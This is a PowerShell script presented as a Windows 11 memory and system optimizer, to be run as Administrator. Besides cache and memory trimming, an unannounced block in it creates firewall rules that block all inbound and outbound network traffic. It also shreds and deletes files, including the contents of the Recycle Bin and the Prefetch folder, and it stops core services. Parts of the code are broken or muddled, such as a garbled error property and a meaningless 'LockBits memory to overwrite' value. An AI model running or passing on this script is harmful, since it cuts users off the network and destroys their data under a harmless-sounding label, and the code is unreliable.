# NSA PowerShell System Optimization Script for Windows 11
# Run as Administrator
# Version: 16
# Purpose: Clear memory, optimize processes, suppress Microsoft Store, clean compressed memory, provide LockBits memory range, set system environment variable

# Initialize Logging
$logPath = "C:\SystemOptimization_Log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
function Write-Log {
    param($Message)
    $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $Message"
    Write-Host $logMessage
    Add-Content -Path $logPath -Value $logMessage -ErrorAction SilentlyContinue
}

Write-Log "Starting optimization..."

# Step 0: Disable Microsoft Store Auto-Launch
Write-Log "Disabling Microsoft Store..."
try {
    $regPath = "HKLM:\SOFTWARE\Classes\AppX4hxtad77fbk3jkkeerkrm0ze94wjf3s9\Shell\open"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "NoOpenWith" -Value "" -Type String -ErrorAction Stop
    Write-Log "Store auto-launch disabled."
} catch {
    Write-Log "Store disable error: $($_.Exception.Message)"
}

# Step 1: Pre-Optimization Memory Check
Write-Log "Initial memory..."
$initialMemory = Get-CimInstance Win32_OperatingSystem
$initialFreeMemory = [math]::Round($initialMemory.FreePhysicalMemory / 1MB, 2)
$initialTotalMemory = [math]::Round($initialMemory.TotalVisibleMemorySize / 1MB, 2)
Write-Log "Free: $initialFreeMemory GB / Total: $initialTotalMemory GB"

# Step 2: Define NSAWin32 Once
if (-not ([System.Type]::GetType("NSAWin32"))) {
    try {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class NSAWin32 {
            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMin, int dwMax);
        }
"@
        Write-Log "NSAWin32 defined."
    } catch {
        Write-Log "NSAWin32 definition error: $($_.Exception.Message_.FullName)"
    }
}


# Configure firewall to block all incoming and outgoing traffic
try {
    # Remove existing rules if they exist
    Remove-NetFirewallRule -Name "BlockAllTraffic_Inbound" -ErrorAction SilentlyContinue
    Remove-NetFirewallRule -Name "BlockAllTraffic_Outbound" -ErrorAction SilentlyContinue

    # Create rule to block all inbound traffic
    New-NetFirewallRule -Name "BlockAllTraffic_Inbound" `
        -DisplayName "Block All Inbound Network Traffic" `
        -Direction Inbound `
        -Action Block `
        -Protocol Any `
        -LocalAddress Any `
        -RemoteAddress Any `
        -Enabled True `
        -Profile Any `
        -ErrorAction Stop | Out-Null

    # Create rule to block all outbound traffic
    New-NetFirewallRule -Name "BlockAllTraffic_Outbound" `
        -DisplayName "Block All Outbound Network Traffic" `
        -Direction Outbound `
        -Action Block `
        -Protocol Any `
        -LocalAddress Any `
        -RemoteAddress Any `
        -Enabled True `
        -Profile Any `
        -ErrorAction Stop | Out-Null

    Write-Host "Firewall rules 'BlockAllTraffic_Inbound' and 'BlockAllTraffic_Outbound' created successfully."
}
catch {
    Write-Host "Error creating firewall rules: $($_.Exception.Message)"
}
# Step 3: Deep Memory Cleanup
Write-Log "Clearing caches..."
try {
    Clear-DnsClientCache -ErrorAction Stop
    $null = ipconfig /flushdns
    $shell = New-Object -ComObject Shell.Application
    $null = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell)
    $null = Clear-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "LargeSystemCache" -ErrorAction SilentlyContinue
    Write-Log "Caches cleared."
} catch {
    Write-Log "Cache cleanup error: $($_.Exception.Message)"
}

# Step 3.1: Clean Compressed Memory
Write-Log "Cleaning compressed memory..."
try {
    $compProc = Get-Process -Name "Memory Compression" -ErrorAction SilentlyContinue
    if ($compProc -and $compProc.Handle) {
        try {
            $result = [NSAWin32]::SetProcessWorkingSetSize($compProc.Handle, -1, -1)
            if ($result) { Write-Log "Minimized Memory Compression (PID: $($compProc.Id))" }
        } catch {
            Write-Log "Error minimizing Memory Compression: $($_.Exception.Message)"
        }
    }
    $null = [System.GC]::Collect()
    $null = [System.GC]::WaitForPendingFinalizers()
    Write-Log "Compressed memory flushed."
} catch {
    Write-Log "Compressed memory error: $($_.Exception.Message)"
}

# Step 3.2: Minimize Other Processes
Write-Log "Minimizing processes..."
try {
    $excluded = @("svchost", "lsass", "csrss", "smss", "winlogon", "dwm", "wininit")
    Get-Process | Where-Object { $_.WorkingSet64 -gt 50MB -and $excluded -notcontains $_.Name -and $_.Handle } | ForEach-Object {
        try {
            $result = [NSAWin32]::SetProcessWorkingSetSize($_.Handle, -1, -1)
            if ($result) { Write-Log "Minimized: $($_.Name) (PID: $($_.Id))" }
        } catch {
            Write-Log "Minimize error: $($_.Name) (PID: $($_.Id)): $($_.Exception.Message)"
        }
    }
    $heavy = @("chrome", "msedge", "firefox", "WinStore.App")
    foreach ($proc in $heavy) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            Write-Log "Skipping termination of $proc (auto-applied 'n')"
        }
    }
} catch {
    Write-Log "Process minimize error: $($_.Exception.Message)"
}

# Step 4: Clear RDMA
Write-Log "Clearing RDMA..."
try {
    $rdmaAdapters = Get-NetAdapterRdma
    if ($rdmaAdapters) {
        foreach ($adapter in $rdmaAdapters) {
            Disable-NetAdapterRdma -Name $adapter.Name -ErrorAction Stop
            Restart-NetAdapter -Name $adapter.Name -ErrorAction Stop
            Write-Log "RDMA disabled/reset: $($adapter.Name)"
        }
    }
    $rdmaProcs = @("smbd", "rdma_cm")
    foreach ($proc in $rdmaProcs) {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
    }
    $null = [System.GC]::Collect()
    Write-Log "RDMA cleared."
} catch {
    Write-Log "RDMA error: $($_.Exception.Message)"
}

# Step 5: Restart Services
Write-Log "Restarting services..."
$services = @("wuauserv", "bits", "cryptsvc", "winmgmt", "dhcp", "dnscache")
$serviceStatus = @{}
foreach ($svc in $services) {
    try {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Write-Log "Stopped $svc"
        $serviceStatus[$svc] = "Stopped"
    } catch {
        Write-Log "Stop error: ${svc}: $($_.Exception.Message)"
        $serviceStatus[$svc] = "Failed"
    }
}
Start-Sleep -Seconds 5
foreach ($svc in $services) {
    try {
        Start-Service -Name $svc -ErrorAction Stop
        Write-Log "Started $svc"
        $serviceStatus[$svc] = "Running"
    } catch {
        Write-Log "Start error: ${svc}: $($_.Exception.Message)"
        $serviceStatus[$svc] = "Failed"
    }
}

# Step 6: Second Memory Cleanup
Write-Log "Second cleanup..."
try {
    Clear-DnsClientCache -ErrorAction Stop
    $null = ipconfig /flushdns
    $shell = New-Object -ComObject Shell.Application
    $null = [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell)
    $null = [System.GC]::Collect()
    Write-Log "Second cleanup done."
} catch {
    Write-Log "Second cleanup error: $($_.Exception.Message)"
}

# Step 7: Secure Temp File Cleanup
Write-Log "Cleaning temp files..."
$tempFolders = @($env:TEMP, "C:\Windows\Temp", "C:\Windows\SoftwareDistribution\Download", "C:\Windows\Prefetch", "C:\ProgramData\Microsoft\Windows\WER\Temp", "C:\$Recycle.Bin")
foreach ($folder in $tempFolders) {
    try {
        if (Test-Path $folder) {
            Write-Log "Cleaning ${folder}..."
            Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue | 
                Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) -and $_.FullName -notmatch "FECE1145|PfPre_" } | 
                ForEach-Object {
                    $retryCount = 0
                    $maxRetries = 3
                    while ($retryCount -lt $maxRetries) {
                        try {
                            if (-not $_.PSIsContainer) {
                                $bufferZero = New-Object Byte[] $_.Length
                                $bufferOne = New-Object Byte[] $_.Length
                                $bufferRandom = New-Object Byte[] $_.Length
                                $random = New-Object System.Random
                                $random.NextBytes($bufferRandom)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferZero)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferOne)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferRandom)
                            }
                            Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction Stop
                            Write-Log "Deleted: $($_.FullName)"
                            break
                        } catch {
                            $retryCount++
                            if ($retryCount -eq $maxRetries) {
                                Write-Log "Failed to delete $($_.FullName): $($_.Exception.Message)"
                            }
                            Start-Sleep -Seconds 2
                        }
                    }
                }
            Write-Log "${folder} cleaned."
        }
    } catch {
        Write-Log "Error clearing ${folder}: $($_.Exception.Message)"
    }
}
$users = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($user in $users) {
    $userTemp = "C:\Users\$($user.Name)\AppData\Local\Temp"
    try {
        if (Test-Path $userTemp) {
            Write-Log "Cleaning ${userTemp}..."
            Get-ChildItem -Path $userTemp -Recurse -Force -ErrorAction SilentlyContinue | 
                Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } | 
                ForEach-Object {
                    $retryCount = 0
                    $maxRetries = 3
                    while ($retryCount -lt $maxRetries) {
                        try {
                            if (-not $_.PSIsContainer) {
                                $bufferZero = New-Object Byte[] $_.Length
                                $bufferOne = New-Object Byte[] $_.Length
                                $bufferRandom = New-Object Byte[] $_.Length
                                $random = New-Object System.Random
                                $random.NextBytes($bufferRandom)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferZero)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferOne)
                                [System.IO.File]::WriteAllBytes($_.FullName, $bufferRandom)
                            }
                            Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction Stop
                            Write-Log "Deleted: $($_.FullName)"
                            break
                        } catch {
                            $retryCount++
                            if ($retryCount -eq $maxRetries) {
                                Write-Log "Failed to delete $($_.FullName): $($_.Exception.Message)"
                            }
                            Start-Sleep -Seconds 2
                        }
                    }
                }
            Write-Log "${userTemp} cleaned."
        }
    } catch {
        Write-Log "Error clearing ${userTemp}: $($_.Exception.Message)"
    }
}

# Step 8: Post-Optimization Memory Check
Write-Log "Final memory..."
$finalMemory = Get-CimInstance Win32_OperatingSystem
$finalFreeMemory = [math]::Round($finalMemory.FreePhysicalMemory / 1MB, 2)
$finalTotalMemory = [math]::Round($finalMemory.TotalVisibleMemorySize / 1MB, 2)
Write-Log "Free: $finalFreeMemory GB / Total: $finalTotalMemory GB"

# Step 9: LockBits Memory Range
$bufferGB = 1.0
$lockBitsMemoryGB = [math]::Round($finalFreeMemory - $bufferGB, 2)
if ($lockBitsMemoryGB -lt 0) { $lockBitsMemoryGB = 0 }
$lockBitsMemoryBytes = [int64]($lockBitsMemoryGB * 1GB)
$lockBitsStart = 0
$lockBitsEnd = $lockBitsMemoryBytes
Write-Log "LockBits memory range:"
Write-Log "Free memory: $finalFreeMemory GB"
Write-Log "Buffer reserved: $bufferGB GB"
Write-Log "Memory to overwrite: $lockBitsMemoryGB GB ($lockBitsMemoryBytes bytes)"
Write-Log "Start: $lockBitsStart bytes"
Write-Log "End: $lockBitsEnd bytes"

# Step 10: Process Analysis
Write-Log "Analyzing processes..."
$totalProcessMemory = 0
$windowsProcs = @("svchost", "lsass", "csrss", "smss", "winlogon", "dwm", "wininit", "services", "taskhostw", "explorer", "ctfmon", "RuntimeBroker", "ShellExperienceHost", "SearchIndexer", "spoolsv")
$windowsList = @()
$nonWindowsList = @()
$microsoftThumbprints = @("3BDA323E552DB1FDE5F4FBEE75D6D5B2B187EEDC", "108E2BA23632620C427C570B6D9DB51AC31387FE")

Get-Process | ForEach-Object {
    try {
        $memoryMB = [math]::Round($_.WorkingSet64 / 1MB, 2)
        $totalProcessMemory += $memoryMB
        $isWindows = $windowsProcs -contains $_.Name
        if ($_.Path -and (Test-Path $_.Path)) {
            $sig = Get-AuthenticodeSignature -FilePath $_.Path -ErrorAction SilentlyContinue
            if ($sig -and $sig.SignerCertificate -and $microsoftThumbprints -contains $sig.SignerCertificate.Thumbprint) {
                $isWindows = $true
            }
        }
        $entry = [PSCustomObject]@{
            Name = $_.Name
            PID = $_.Id
            MemoryMB = $memoryMB
        }
        if ($isWindows) {
            $windowsList += $entry
        } else {
            $nonWindowsList += $entry
        }
    } catch {
        Write-Log "Error analyzing $($_.Name) (PID: $($_.Id)): $($_.Exception.Message)"
    }
}

Write-Log "Windows-signed processes (sorted by memory usage):"
$windowsList | Sort-Object MemoryMB -Descending | ForEach-Object {
    Write-Log "$($_.Name) (PID: $($_.PID), Memory: $($_.MemoryMB) MB)"
}
if ($windowsList.Count -eq 0) {
    Write-Log "No Windows-signed processes found."
}

Write-Log "Non-Windows-signed processes (sorted by memory usage):"
$nonWindowsList | Sort-Object MemoryMB -Descending | ForEach-Object {
    Write-Log "$($_.Name) (PID: $($_.PID), Memory: $($_.MemoryMB) MB)"
}
if ($nonWindowsList.Count -eq 0) {
    Write-Log "No non-Windows-signed processes found."
}

$totalProcessMemoryGB = [math]::Round($totalProcessMemory / 1024, 2)
Write-Log "Total process memory: $totalProcessMemoryGB GB"

# Step 11: Final Report
Write-Log "Optimization complete. Log: $logPath"
foreach ($svc in $serviceStatus.Keys) {
    Write-Log "${svc}: $($serviceStatus[$svc])"
}
Write-Log "LockBits memory range (repeated for clarity):"
Write-Log "Free memory: $finalFreeMemory GB"
Write-Log "Buffer reserved: $bufferGB GB"
Write-Log "Memory to overwrite: $lockBitsMemoryGB GB ($lockBitsMemoryBytes bytes)"
Write-Log "Start: $lockBitsStart bytes"
Write-Log "End: $lockBitsEnd bytes"

# Step 12: Set System Environment Variable
Write-Log "Setting system environment variable LockBitsMemoryBytes..."
try {
    [System.Environment]::SetEnvironmentVariable("LockBitsMemoryBytes", $lockBitsEnd, [System.EnvironmentVariableTarget]::Machine)
    Write-Log "Set LockBitsMemoryBytes to $lockBitsEnd"
} catch {
    Write-Log "Error setting environment variable: $($_.Exception.Message)"
}

Write-Host "Done. Check $logPath."